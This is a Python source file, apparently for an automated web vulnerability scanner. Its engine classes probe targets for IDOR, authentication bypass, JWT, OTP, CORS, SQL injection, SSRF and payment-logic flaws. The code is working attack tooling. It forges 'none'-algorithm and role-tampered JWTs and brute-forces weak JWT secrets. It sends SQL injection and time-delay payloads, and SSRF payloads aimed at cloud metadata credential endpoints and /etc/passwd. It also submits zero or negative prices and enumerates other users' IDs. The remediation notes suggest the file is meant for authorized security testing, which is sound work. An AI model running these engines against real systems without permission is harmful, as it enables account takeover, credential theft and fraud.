"""
engines.py — All attack engines in one file (modular, importable)
Covers: IDOR, Auth Bypass, JWT, OTP, Session, BAC, Mass Assignment,
        Business Logic, Payment, Race Condition, SQL Injection, XSS,
        SSRF, CORS, Open Redirect, LFI, GraphQL, Param Pollution, WAF Detection
"""
import asyncio
import base64
import hashlib
import hmac
import json
import random
import re
import string
import time
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, urljoin, urlencode, parse_qs


# ═══════════════════════════════════════════════════════════
# ENGINE BASE
# ═══════════════════════════════════════════════════════════

class EngineResult:
    def __init__(self):
        self.success = False
        self.findings = []
        self.info = {}
        self.error = None

    def add_finding(self, vuln_type: str, severity: str, endpoint: str,
                    description: str, param: str = None, method: str = "GET",
                    proof_req: str = None, proof_resp: str = None,
                    confidence: int = 70, remediation: str = None):
        self.findings.append({
            "vuln_type": vuln_type, "severity": severity, "endpoint": endpoint,
            "description": description, "param": param, "method": method,
            "proof_req": proof_req, "proof_resp": proof_resp[:500] if proof_resp else None,
            "confidence": confidence, "remediation": remediation
        })
        self.success = True

    def to_dict(self):
        return {"success": self.success, "findings": self.findings,
                "info": self.info, "error": self.error}


class BaseEngine:
    def __init__(self, http_client, db, rules: dict, logger=None):
        self.http = http_client
        self.db = db
        self.rules = rules
        self.log = logger

    def _log(self, msg, level="info"):
        if self.log:
            getattr(self.log, level, self.log.info)(msg)

    async def run(self, params: dict) -> EngineResult:
        raise NotImplementedError


# ═══════════════════════════════════════════════════════════
# E01 — RECON ENGINE
# ═══════════════════════════════════════════════════════════

class ReconEngine(BaseEngine):
    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        url = params.get("url", "")
        self._log(f"Recon: {url}")

        try:
            # Fetch target homepage
            resp = await self.http.request("GET", url, timeout=10)
            if not resp:
                result.error = "Target unreachable"
                return result

            # Detect technology from headers + body
            tech_stack = self._detect_tech(resp)
            result.info["tech_stack"] = tech_stack
            result.info["status"] = resp.get("status")
            result.info["server"] = resp.get("headers", {}).get("server", "unknown")
            result.info["waf"] = self.http.waf_detected

            # Security headers check
            security_issues = self._check_security_headers(resp.get("headers", {}))
            for issue in security_issues:
                result.add_finding(
                    vuln_type="MISSING_SECURITY_HEADER",
                    severity="LOW",
                    endpoint=url,
                    description=issue,
                    confidence=90,
                    remediation=f"Add missing security header: {issue}"
                )

            self._log(f"Tech stack: {tech_stack}")
            result.success = True

        except Exception as e:
            result.error = str(e)

        return result

    def _detect_tech(self, resp: dict) -> List[str]:
        tech = []
        headers = resp.get("headers", {})
        body = resp.get("body", "")[:5000]
        headers_str = str(headers).lower()

        tech_patterns = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Laravel": ["laravel_session", "x-powered-by: php"],
            "Django": ["csrftoken", "django"],
            "Rails": ["x-powered-by: phusion passenger", "_rails_session"],
            "Express": ["x-powered-by: express"],
            "ASP.NET": ["asp.net", "viewstate", "__RequestVerificationToken"],
            "Spring": ["x-application-context", "jsessionid"],
            "Next.js": ["x-nextjs", "__next"],
            "PHP": ["x-powered-by: php", ".php"],
            "React": ["react", "_next"],
            "Vue": ["vue.js", "__vue__"],
            "Angular": ["ng-version", "angular"],
            "jQuery": ["jquery"],
            "Bootstrap": ["bootstrap"],
        }

        combined = (headers_str + body.lower())
        for tech_name, patterns in tech_patterns.items():
            if any(p in combined for p in patterns):
                tech.append(tech_name)

        return tech

    def _check_security_headers(self, headers: dict) -> List[str]:
        required_headers = {
            "X-Frame-Options": "Prevents clickjacking",
            "X-Content-Type-Options": "Prevents MIME sniffing",
            "Content-Security-Policy": "Prevents XSS",
            "Strict-Transport-Security": "Enforces HTTPS",
            "X-XSS-Protection": "Browser XSS filter",
        }
        headers_lower = {k.lower(): v for k, v in headers.items()}
        missing = []
        for header, desc in required_headers.items():
            if header.lower() not in headers_lower:
                missing.append(f"Missing {header}: {desc}")
        return missing


# ═══════════════════════════════════════════════════════════
# E02 — ENDPOINT DISCOVERY (without Playwright — pure HTTP)
# ═══════════════════════════════════════════════════════════

class EndpointDiscoveryEngine(BaseEngine):
    COMMON_PATHS = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/graphql", "/graphiql", "/gql",
        "/admin", "/administrator", "/admin/login",
        "/login", "/logout", "/register", "/signup",
        "/profile", "/account", "/settings", "/dashboard",
        "/users", "/user", "/api/users", "/api/user",
        "/api/auth", "/auth", "/oauth", "/token",
        "/api/admin", "/api/orders", "/api/payment",
        "/api/products", "/api/files", "/api/upload",
        "/swagger", "/swagger-ui", "/api-docs",
        "/openapi.json", "/.well-known/openapi.json",
        "/robots.txt", "/sitemap.xml",
        "/.git/config", "/.env", "/config.json",
        "/api/me", "/api/profile", "/api/account",
        "/api/search", "/api/config", "/api/health",
        "/ws", "/websocket", "/socket.io",
        "/api/reset-password", "/forgot-password",
        "/api/2fa", "/verify", "/confirm",
        "/api/notifications", "/api/messages",
        "/api/reports", "/api/export", "/api/import",
    ]

    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        base_url = params.get("url", "").rstrip("/")
        self._log(f"Discovering endpoints on {base_url}")

        found_endpoints = []

        for path in self.COMMON_PATHS:
            url = base_url + path
            try:
                resp = await self.http.request("GET", url, timeout=5)
                if resp and resp.get("status") not in [404, 0]:
                    found_endpoints.append({
                        "url": url,
                        "status": resp.get("status"),
                        "size": len(resp.get("body", ""))
                    })
                    # Add to DB
                    node_type = self._classify_endpoint(path)
                    priority = self._get_priority(node_type)
                    self.db.add_node(url, node_type=node_type, priority=priority,
                                    sensitive=node_type in ["AUTH","PAYMENT","ADMIN","FILE"])
                    self._log(f"  Found: {url} [{resp.get('status')}] [{node_type}]")

                await asyncio.sleep(0.1)  # Small delay
            except Exception as e:
                pass  # Skip timeouts

        result.info["endpoints_found"] = len(found_endpoints)
        result.info["endpoints"] = found_endpoints
        result.success = True
        return result

    def _classify_endpoint(self, path: str) -> str:
        path_lower = path.lower()
        if any(x in path_lower for x in ["/login", "/logout", "/auth", "/token", "/oauth",
                                          "/register", "/signup", "/2fa", "/otp", "/verify"]):
            return "AUTH"
        if any(x in path_lower for x in ["/payment", "/pay", "/checkout", "/order", "/invoice",
                                          "/billing", "/subscription", "/purchase"]):
            return "PAYMENT"
        if any(x in path_lower for x in ["/admin", "/administrator", "/dashboard/admin"]):
            return "ADMIN"
        if any(x in path_lower for x in ["/upload", "/file", "/download", "/export", "/import"]):
            return "FILE"
        if any(x in path_lower for x in ["/graphql", "/gql", "/graphiql"]):
            return "GRAPHQL"
        if any(x in path_lower for x in ["/ws", "/websocket", "/socket"]):
            return "WEBSOCKET"
        if any(x in path_lower for x in ["/api"]):
            return "API"
        if any(x in path_lower for x in ["/profile", "/account", "/user", "/me"]):
            return "PROFILE"
        return "NORMAL"

    def _get_priority(self, node_type: str) -> int:
        pmap = {"AUTH": 10, "PAYMENT": 10, "ADMIN": 9, "FILE": 7,
                "GRAPHQL": 8, "WEBSOCKET": 6, "API": 6, "PROFILE": 7, "NORMAL": 3}
        return pmap.get(node_type, 3)


# ═══════════════════════════════════════════════════════════
# E03 — IDOR ENGINE
# ═══════════════════════════════════════════════════════════

class IDOREngine(BaseEngine):
    ID_PARAMS = ["id", "user_id", "order_id", "account_id", "uid", "pid", "doc_id",
                 "file_id", "invoice_id", "ticket_id", "profile_id", "item_id",
                 "record_id", "customer_id", "transaction_id", "payment_id"]

    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        endpoint = params.get("endpoint", "")
        methods = params.get("methods", ["GET"])
        session_a = params.get("session_a")  # token for user A
        session_b = params.get("session_b")  # target user B's expected ID

        self._log(f"IDOR test: {endpoint}")

        # Step 1: Baseline — get User A's own data
        baseline_resp = await self.http.request("GET", endpoint,
                                                 session_token=session_a, timeout=8)
        if not baseline_resp or baseline_resp.get("status") != 200:
            result.info["skipped"] = "baseline failed"
            return result

        baseline_body = baseline_resp.get("body", "")
        baseline_size = len(baseline_body)

        # Save baseline
        self.db.save_baseline(endpoint, baseline_resp.get("status", 200),
                              baseline_size, baseline_resp.get("response_time", 0),
                              self.http.body_hash(baseline_body))

        # Step 2: Extract ID values from response
        own_ids = self._extract_ids(baseline_body)
        self._log(f"  Found IDs in response: {own_ids}")

        # Step 3: Try different ID values
        test_ids = self._generate_test_ids(own_ids)

        for test_id in test_ids[:20]:  # Max 20 attempts
            for method in methods:
                modified_url = self._inject_id(endpoint, test_id)
                if not modified_url:
                    continue

                resp = await self.http.request(method, modified_url,
                                               session_token=session_a, timeout=8)
                if not resp:
                    continue

                # Check for IDOR
                if self._is_idor(resp, baseline_resp, test_id, own_ids):
                    result.add_finding(
                        vuln_type="IDOR",
                        severity="HIGH",
                        endpoint=endpoint,
                        param="id",
                        method=method,
                        description=f"IDOR: Accessing ID {test_id} returned different user data",
                        proof_req=f"{method} {modified_url}",
                        proof_resp=resp.get("body", "")[:300],
                        confidence=80,
                        remediation="Implement proper object-level authorization. Verify that requesting user owns the resource before returning it."
                    )
                    self._log(f"  [IDOR FOUND] {method} {modified_url}", "critical" if hasattr(self.log, 'critical') else "info")

                await asyncio.sleep(0.2)

        result.success = True
        return result

    def _extract_ids(self, body: str) -> List[str]:
        """Extract ID values from response body"""
        ids = []
        try:
            data = json.loads(body)
            ids.extend(self._recursive_extract_ids(data))
        except:
            # Try regex
            ids.extend(re.findall(r'"id":\s*(\d+)', body))
            ids.extend(re.findall(r'"user_id":\s*(\d+)', body))
        return list(set(ids))[:5]

    def _recursive_extract_ids(self, obj, depth=0) -> List:
        if depth > 5:
            return []
        ids = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k in self.ID_PARAMS and isinstance(v, (int, str)):
                    ids.append(str(v))
                ids.extend(self._recursive_extract_ids(v, depth+1))
        elif isinstance(obj, list):
            for item in obj[:5]:
                ids.extend(self._recursive_extract_ids(item, depth+1))
        return ids

    def _generate_test_ids(self, own_ids: List[str]) -> List[str]:
        test_ids = []
        for own_id in own_ids:
            try:
                n = int(own_id)
                # Sequential neighbors
                for offset in range(1, 5):
                    test_ids.append(str(n + offset))
                    if n - offset > 0:
                        test_ids.append(str(n - offset))
                test_ids.append(str(1))  # First ID (often admin)
                test_ids.append(str(2))
            except ValueError:
                # UUID or string ID — try slight variations
                test_ids.extend(["1", "2", "3", "admin", "root"])
        if not test_ids:
            test_ids = ["1", "2", "3", "4", "5", "admin"]
        return list(set(test_ids))

    def _inject_id(self, url: str, new_id: str) -> Optional[str]:
        """Replace ID in URL or query params"""
        # Try path ID replacement: /api/user/123 → /api/user/456
        path_id = re.search(r'/(\d+)(?:/|$|\?)', url)
        if path_id:
            return url.replace(f"/{path_id.group(1)}", f"/{new_id}", 1)
        # Try query param
        for param in self.ID_PARAMS:
            if f"{param}=" in url:
                return re.sub(f"{param}=\\d+", f"{param}={new_id}", url)
        return None

    def _is_idor(self, resp: dict, baseline: dict, test_id: str, own_ids: List) -> bool:
        """Check if response indicates IDOR"""
        status = resp.get("status", 0)
        body = resp.get("body", "")
        size = len(body)
        baseline_size = len(baseline.get("body", ""))

        if status not in [200, 201]:
            return False

        # Size difference indicates different data
        if abs(size - baseline_size) > 200:
            return True

        # Check if response contains different ID than requested own
        if test_id not in (own_ids or []) and test_id in body:
            return True

        # Check for new personal data patterns
        pii_patterns = [r'"email":', r'"phone":', r'"address":', r'"name":',
                        r'"password":', r'"credit_card":']
        for pattern in pii_patterns:
            if re.search(pattern, body) and not re.search(pattern, baseline.get("body", "")):
                return True

        return False


# ═══════════════════════════════════════════════════════════
# E04 — AUTH BYPASS ENGINE
# ═══════════════════════════════════════════════════════════

class AuthBypassEngine(BaseEngine):
    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        endpoint = params.get("endpoint", "")
        self._log(f"Auth bypass test: {endpoint}")

        # Test 1: Access without token
        resp_no_auth = await self.http.request("GET", endpoint, timeout=8)
        if resp_no_auth and resp_no_auth.get("status") == 200:
            body = resp_no_auth.get("body", "")
            # Check it's not just a login redirect
            if len(body) > 100 and not any(x in body.lower() for x in
                                            ["login", "authenticate", "sign in", "unauthorized"]):
                result.add_finding(
                    vuln_type="AUTH_BYPASS",
                    severity="CRITICAL",
                    endpoint=endpoint,
                    method="GET",
                    description="Endpoint accessible without authentication",
                    proof_req=f"GET {endpoint}",
                    proof_resp=body[:300],
                    confidence=90,
                    remediation="Add authentication middleware. Verify token before processing request."
                )

        # Test 2: Method override
        for method in ["POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]:
            resp = await self.http.request(method, endpoint, timeout=5)
            if resp and resp.get("status") == 200:
                result.add_finding(
                    vuln_type="HTTP_METHOD_OVERRIDE_BYPASS",
                    severity="HIGH",
                    endpoint=endpoint,
                    method=method,
                    description=f"Endpoint accessible via {method} without authentication",
                    proof_req=f"{method} {endpoint}",
                    proof_resp=resp.get("body", "")[:200],
                    confidence=75,
                    remediation="Restrict HTTP methods. Apply auth check to all methods."
                )

        # Test 3: Path variations
        parsed = urlparse(endpoint)
        path_variations = [
            endpoint.replace(parsed.path, parsed.path.upper()),
            endpoint + "/",
            endpoint + ".json",
            endpoint + ".php",
            endpoint + "?admin=true",
        ]

        for variant in path_variations:
            resp = await self.http.request("GET", variant, timeout=5)
            if resp and resp.get("status") == 200:
                result.add_finding(
                    vuln_type="BAC_PATH_BYPASS",
                    severity="HIGH",
                    endpoint=variant,
                    method="GET",
                    description=f"Auth bypass via path variation: {variant}",
                    confidence=70,
                    remediation="Normalize URL paths before auth check."
                )
            await asyncio.sleep(0.1)

        result.success = True
        return result


# ═══════════════════════════════════════════════════════════
# E05 — JWT ENGINE
# ═══════════════════════════════════════════════════════════

class JWTEngine(BaseEngine):
    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        token = params.get("token", "")
        endpoint = params.get("endpoint", "")

        if not token or not token.startswith("eyJ"):
            result.info["skipped"] = "no JWT token provided"
            return result

        self._log(f"JWT analysis: {endpoint}")

        # Decode JWT parts
        try:
            parts = token.split(".")
            if len(parts) != 3:
                result.info["skipped"] = "not a valid JWT"
                return result

            header = json.loads(base64.b64decode(parts[0] + "==").decode())
            payload = json.loads(base64.b64decode(parts[1] + "==").decode())

            self._log(f"  JWT header: {header}")
            self._log(f"  JWT payload: {json.dumps(payload)[:200]}")

            # Test 1: Algorithm None
            none_token = self._create_none_token(header, payload)
            resp = await self.http.request("GET", endpoint,
                                           headers={"Authorization": f"Bearer {none_token}"})
            if resp and resp.get("status") == 200:
                result.add_finding(
                    vuln_type="JWT_NONE_ALGORITHM",
                    severity="CRITICAL",
                    endpoint=endpoint,
                    description="JWT accepts 'none' algorithm — signature not verified",
                    proof_req=f"Authorization: Bearer {none_token[:50]}...",
                    proof_resp=resp.get("body", "")[:200],
                    confidence=95,
                    remediation="Explicitly reject 'none' algorithm. Use whitelist of accepted algorithms."
                )

            # Test 2: Role claim manipulation
            if "role" in payload or "admin" in payload or "is_admin" in payload:
                tampered = self._tamper_role(header, payload, parts[2])
                resp2 = await self.http.request("GET", endpoint,
                                                headers={"Authorization": f"Bearer {tampered}"})
                if resp2 and resp2.get("status") == 200:
                    result.add_finding(
                        vuln_type="JWT_ROLE_MANIPULATION",
                        severity="CRITICAL",
                        endpoint=endpoint,
                        description="JWT role claim modifiable — server doesn't verify signature",
                        confidence=90,
                        remediation="Verify JWT signature on every request."
                    )

            # Test 3: Expired token (if exp present)
            if "exp" in payload:
                no_exp_token = self._remove_exp(header, payload)
                resp3 = await self.http.request("GET", endpoint,
                                                headers={"Authorization": f"Bearer {no_exp_token}"})
                if resp3 and resp3.get("status") == 200:
                    result.add_finding(
                        vuln_type="JWT_EXPIRY_NOT_CHECKED",
                        severity="HIGH",
                        endpoint=endpoint,
                        description="JWT expiry claim not enforced",
                        confidence=80,
                        remediation="Always validate 'exp' claim server-side."
                    )

            # Test 4: Weak secret brute force (offline)
            alg = header.get("alg", "").upper()
            if alg in ["HS256", "HS384", "HS512"]:
                weak_secret = self._brute_force_secret(parts, alg)
                if weak_secret:
                    result.add_finding(
                        vuln_type="JWT_WEAK_SECRET",
                        severity="CRITICAL",
                        endpoint=endpoint,
                        description=f"JWT secret is weak: '{weak_secret}'",
                        confidence=99,
                        remediation="Use cryptographically random secret of at least 256 bits."
                    )

        except Exception as e:
            result.error = str(e)

        result.success = True
        return result

    def _b64url_encode(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _b64url_decode(self, s: str) -> bytes:
        padding = 4 - len(s) % 4
        return base64.urlsafe_b64decode(s + "=" * padding)

    def _create_none_token(self, header: dict, payload: dict) -> str:
        h = header.copy()
        h["alg"] = "none"
        h_enc = self._b64url_encode(json.dumps(h).encode())
        p_enc = self._b64url_encode(json.dumps(payload).encode())
        return f"{h_enc}.{p_enc}."

    def _tamper_role(self, header: dict, payload: dict, orig_sig: str) -> str:
        """Modify role to admin while keeping original signature (for weak secret test)"""
        p = payload.copy()
        for field in ["role", "admin", "is_admin", "user_type", "privilege"]:
            if field in p:
                p[field] = "admin" if field != "is_admin" else True
        h_enc = self._b64url_encode(json.dumps(header).encode())
        p_enc = self._b64url_encode(json.dumps(p).encode())
        return f"{h_enc}.{p_enc}.{orig_sig}"

    def _remove_exp(self, header: dict, payload: dict) -> str:
        p = payload.copy()
        p.pop("exp", None)
        p.pop("nbf", None)
        h_enc = self._b64url_encode(json.dumps(header).encode())
        p_enc = self._b64url_encode(json.dumps(p).encode())
        return f"{h_enc}.{p_enc}."

    def _brute_force_secret(self, parts: List[str], alg: str) -> Optional[str]:
        """Fast offline brute force of common weak secrets"""
        common_secrets = [
            "secret", "password", "123456", "admin", "key",
            "test", "your-256-bit-secret", "supersecret", "secret123",
            "jwt_secret", "mysecret", "privatekey", "changeme",
            "default", "qwerty", "1234567890", "jwt", "access",
        ]
        msg = f"{parts[0]}.{parts[1]}".encode()

        alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hash_func = alg_map.get(alg, hashlib.sha256)

        try:
            expected_sig = self._b64url_decode(parts[2])
        except:
            return None

        for secret in common_secrets:
            sig = hmac.new(secret.encode(), msg, hash_func).digest()
            if sig == expected_sig:
                return secret

        return None


# ═══════════════════════════════════════════════════════════
# E06 — OTP ENGINE
# ═══════════════════════════════════════════════════════════

class OTPEngine(BaseEngine):
    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        endpoint = params.get("endpoint", "")
        otp_param = params.get("otp_param", "otp")
        session_token = params.get("session_token")
        otp_length = params.get("otp_length", 6)

        self._log(f"OTP test: {endpoint}")

        # Test 1: Rate limit check (send 5 attempts)
        blocked_at = None
        for i, otp in enumerate(["000000", "111111", "222222", "333333", "444444"]):
            resp = await self.http.request(
                "POST", endpoint,
                json_body={otp_param: otp},
                session_token=session_token,
                timeout=8
            )
            if resp and resp.get("status") == 429:
                blocked_at = i + 1
                break
            await asyncio.sleep(0.3)

        if not blocked_at:
            result.add_finding(
                vuln_type="OTP_NO_RATE_LIMIT",
                severity="CRITICAL",
                endpoint=endpoint,
                description=f"OTP endpoint has no rate limiting — brute force possible for {otp_length}-digit OTP",
                confidence=85,
                remediation="Implement rate limiting: max 5 attempts per 15 minutes. Lock account after repeated failures."
            )

        # Test 2: OTP reuse (if we have a valid OTP from params)
        valid_otp = params.get("valid_otp")
        if valid_otp:
            for i in range(3):
                resp = await self.http.request(
                    "POST", endpoint,
                    json_body={otp_param: valid_otp},
                    session_token=session_token
                )
                if resp and resp.get("status") == 200:
                    if i > 0:
                        result.add_finding(
                            vuln_type="OTP_REUSE",
                            severity="HIGH",
                            endpoint=endpoint,
                            description=f"OTP can be reused — same OTP valid on attempt {i+1}",
                            confidence=90,
                            remediation="Invalidate OTP immediately after first successful use."
                        )
                        break
                await asyncio.sleep(0.5)

        # Test 3: Response manipulation hint
        result.info["manual_test"] = "Try intercepting OTP verify response and changing 'success:false' to 'success:true'"

        result.success = True
        return result


# ═══════════════════════════════════════════════════════════
# E07 — CORS ENGINE
# ═══════════════════════════════════════════════════════════

class CORSEngine(BaseEngine):
    TEST_ORIGINS = [
        "https://evil.com",
        "null",
        "https://evil.{TARGET}",
        "https://{TARGET}.evil.com",
        "http://evil.com",
    ]

    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        endpoint = params.get("endpoint", "")
        target_domain = urlparse(endpoint).netloc

        self._log(f"CORS test: {endpoint}")

        for origin_template in self.TEST_ORIGINS:
            origin = origin_template.replace("{TARGET}", target_domain)

            resp = await self.http.request(
                "GET", endpoint,
                headers={"Origin": origin},
                timeout=8
            )
            if not resp:
                continue

            resp_headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
            acao = resp_headers.get("access-control-allow-origin", "")
            acac = resp_headers.get("access-control-allow-credentials", "").lower()

            if acao == origin or acao == "*":
                severity = "CRITICAL" if acac == "true" else "HIGH"
                result.add_finding(
                    vuln_type="CORS_MISCONFIGURATION",
                    severity=severity,
                    endpoint=endpoint,
                    description=f"CORS reflects origin '{origin}'. "
                               f"Credentials: {acac}. "
                               f"{'CRITICAL: Can steal authenticated data' if acac == 'true' else 'Can read responses'}",
                    proof_req=f"Origin: {origin}",
                    proof_resp=f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                    confidence=90 if acac == "true" else 75,
                    remediation="Whitelist specific allowed origins. Never reflect arbitrary Origin header. "
                               "Remove credentials=true unless absolutely necessary."
                )

            await asyncio.sleep(0.2)

        result.success = True
        return result


# ═══════════════════════════════════════════════════════════
# E08 — SQL INJECTION ENGINE
# ═══════════════════════════════════════════════════════════

class SQLInjectionEngine(BaseEngine):
    ERROR_INDICATORS = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "pg_query()", "pg_exec()",
        "ora-01756", "ora-00907", "ora-00933",
        "sqlite3.operationalerror",
        "invalid input syntax",
        "supplied argument is not a valid mysql",
        "microsoft ole db provider for sql server",
        "[microsoft][odbc sql server driver]",
    ]

    BOOLEAN_PAIRS = [
        ("1' AND 1=1--", "1' AND 1=2--"),
        ("1 AND 1=1", "1 AND 1=2"),
    ]

    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        endpoint = params.get("endpoint", "")
        param = params.get("param", "id")
        method = params.get("method", "GET")
        session_token = params.get("session_token")

        self._log(f"SQLi test: {endpoint} param={param}")

        # Get baseline
        baseline = await self.http.request(method, endpoint, session_token=session_token)
        if not baseline:
            return result
        baseline_size = len(baseline.get("body", ""))

        # Test 1: Error-based
        for payload in ["'", "''", "1'", "\" OR \"\"=\""]:
            resp = await self._test_payload(endpoint, param, method, payload, session_token)
            if resp:
                body_lower = resp.get("body", "").lower()
                for indicator in self.ERROR_INDICATORS:
                    if indicator in body_lower:
                        result.add_finding(
                            vuln_type="SQL_INJECTION_ERROR",
                            severity="CRITICAL",
                            endpoint=endpoint,
                            param=param,
                            method=method,
                            description=f"SQL error-based injection via param '{param}' with payload: {payload}",
                            proof_req=f"Payload: {payload}",
                            proof_resp=resp.get("body", "")[:300],
                            confidence=95,
                            remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL."
                        )
                        return result  # Found, no need to continue

            await asyncio.sleep(0.3)

        # Test 2: Boolean-based
        for true_payload, false_payload in self.BOOLEAN_PAIRS:
            resp_true = await self._test_payload(endpoint, param, method, true_payload, session_token)
            resp_false = await self._test_payload(endpoint, param, method, false_payload, session_token)

            if resp_true and resp_false:
                size_true = len(resp_true.get("body", ""))
                size_false = len(resp_false.get("body", ""))
                if abs(size_true - size_false) > 100 and abs(size_true - baseline_size) < 50:
                    result.add_finding(
                        vuln_type="SQL_INJECTION_BOOLEAN",
                        severity="CRITICAL",
                        endpoint=endpoint,
                        param=param,
                        method=method,
                        description=f"Boolean-based SQL injection in param '{param}'",
                        confidence=80,
                        remediation="Use parameterized queries. Validate all input."
                    )
                    return result

            await asyncio.sleep(0.3)

        # Test 3: Time-based (last resort)
        time_payload = "1'; WAITFOR DELAY '0:0:3'--"
        t0 = time.time()
        resp_time = await self._test_payload(endpoint, param, method, time_payload, session_token, timeout=10)
        elapsed = time.time() - t0

        if elapsed > 2.5:  # 3 second delay detected
            result.add_finding(
                vuln_type="SQL_INJECTION_TIME",
                severity="CRITICAL",
                endpoint=endpoint,
                param=param,
                description=f"Time-based SQL injection: {elapsed:.1f}s delay with WAITFOR",
                confidence=85,
                remediation="Use parameterized queries immediately."
            )

        result.success = True
        return result

    async def _test_payload(self, url, param, method, payload, token, timeout=8):
        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={payload}"
            return await self.http.request("GET", test_url, session_token=token, timeout=timeout)
        else:
            return await self.http.request(method, url,
                                           json_body={param: payload},
                                           session_token=token, timeout=timeout)


# ═══════════════════════════════════════════════════════════
# E09 — SSRF ENGINE
# ═══════════════════════════════════════════════════════════

class SSRFEngine(BaseEngine):
    SSRF_PARAMS = ["url", "uri", "path", "dest", "destination", "redirect",
                   "callback", "return", "return_url", "next", "data", "reference",
                   "ref", "feed", "host", "to", "from", "load_url", "file_name",
                   "open", "img", "src", "fetch", "proxy", "link"]

    AWS_IMDS_URL = "http://169.254.169.254/latest/meta-data/"
    AWS_CREDS_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    GCP_IMDS_URL = "http://metadata.google.internal/computeMetadata/v1/"

    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        endpoint = params.get("endpoint", "")
        url_params = params.get("params", [])
        session_token = params.get("session_token")

        self._log(f"SSRF test: {endpoint}")

        # Find URL-type parameters
        ssrf_candidates = [p for p in url_params if p.lower() in self.SSRF_PARAMS]
        if not ssrf_candidates and url_params:
            ssrf_candidates = url_params[:3]  # Test first 3 params anyway

        ssrf_payloads = [
            self.AWS_IMDS_URL,
            self.AWS_CREDS_URL,
            self.GCP_IMDS_URL,
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://0.0.0.0:80",
            "http://[::1]:80",
            "http://169.254.169.254",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
        ]

        for ssrf_param in ssrf_candidates:
            for payload in ssrf_payloads[:5]:  # Test first 5 payloads per param
                resp = await self.http.request(
                    "GET", endpoint,
                    params={ssrf_param: payload},
                    session_token=session_token,
                    timeout=8
                )
                if resp and self._is_ssrf(resp, payload):
                    severity = "CRITICAL" if "169.254.169.254" in payload else "HIGH"
                    result.add_finding(
                        vuln_type="SSRF",
                        severity=severity,
                        endpoint=endpoint,
                        param=ssrf_param,
                        description=f"SSRF via param '{ssrf_param}' — server fetched {payload}",
                        proof_req=f"?{ssrf_param}={payload}",
                        proof_resp=resp.get("body", "")[:300],
                        confidence=85,
                        remediation="Validate and whitelist allowed URLs. Block internal IP ranges. Use DNS allowlist."
                    )
                await asyncio.sleep(0.3)

        result.success = True
        return result

    def _is_ssrf(self, resp: dict, payload: str) -> bool:
        body = resp.get("body", "").lower()
        status = resp.get("status", 0)

        if status != 200:
            return False

        # AWS metadata indicators
        if "169.254.169.254" in payload:
            aws_indicators = ["ami-id", "instance-id", "security-credentials",
                              "iam", "hostname", "local-hostname"]
            if any(i in body for i in aws_indicators):
                return True

        # Linux file read
        if "etc/passwd" in payload and "root:" in body:
            return True

        # Internal service
        if "127.0.0.1" in payload or "localhost" in payload:
            internal_indicators = ["server", "apache", "nginx", "ok", "redis"]
            if any(i in body for i in internal_indicators):
                return True

        return False


# ═══════════════════════════════════════════════════════════
# E10 — BUSINESS LOGIC ENGINE
# ═══════════════════════════════════════════════════════════

class BusinessLogicEngine(BaseEngine):
    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        endpoint = params.get("endpoint", "")
        endpoint_type = params.get("endpoint_type", "NORMAL")
        session_token = params.get("session_token")

        self._log(f"Business logic test: {endpoint} [{endpoint_type}]")

        if endpoint_type == "PAYMENT":
            await self._test_payment_logic(endpoint, session_token, result)
        elif endpoint_type in ["API", "NORMAL"]:
            await self._test_quantity_manipulation(endpoint, session_token, result)

        # Universal: workflow step skip
        await self._test_workflow_skip(endpoint, session_token, result)

        result.success = True
        return result

    async def _test_payment_logic(self, endpoint, token, result):
        """Test payment manipulation"""
        test_cases = [
            {"price": 0, "desc": "Zero price"},
            {"price": -1, "desc": "Negative price"},
            {"price": 0.01, "desc": "Minimal price"},
            {"amount": 0, "desc": "Zero amount"},
            {"total": -100, "desc": "Negative total"},
        ]
        for tc in test_cases:
            resp = await self.http.request("POST", endpoint, json_body=tc, session_token=token)
            if resp and resp.get("status") in [200, 201]:
                body = resp.get("body", "")
                if any(x in body.lower() for x in ["success", "order_id", "transaction", "confirmed"]):
                    result.add_finding(
                        vuln_type="PAYMENT_MANIPULATION",
                        severity="CRITICAL",
                        endpoint=endpoint,
                        description=f"Payment accepted with manipulated value: {tc}",
                        proof_req=f"POST {endpoint} body={tc}",
                        proof_resp=body[:300],
                        confidence=90,
                        remediation="Always validate price server-side. Never trust client-provided prices."
                    )
            await asyncio.sleep(0.3)

    async def _test_quantity_manipulation(self, endpoint, token, result):
        """Test quantity/amount manipulation"""
        for qty in [-1, 0, 999999]:
            resp = await self.http.request("POST", endpoint,
                                           json_body={"quantity": qty},
                                           session_token=token)
            if resp and resp.get("status") in [200, 201]:
                result.add_finding(
                    vuln_type="QUANTITY_MANIPULATION",
                    severity="HIGH",
                    endpoint=endpoint,
                    description=f"Endpoint accepts invalid quantity: {qty}",
                    confidence=70,
                    remediation="Validate quantity ranges server-side. Reject negative or zero quantities."
                )
            await asyncio.sleep(0.2)

    async def _test_workflow_skip(self, endpoint, token, result):
        """Test if protected endpoints accessible without completing prerequisites"""
        # This is more of a hint for manual testing
        result.info["workflow_hint"] = f"Manually test: access {endpoint} directly without completing prerequisite steps"


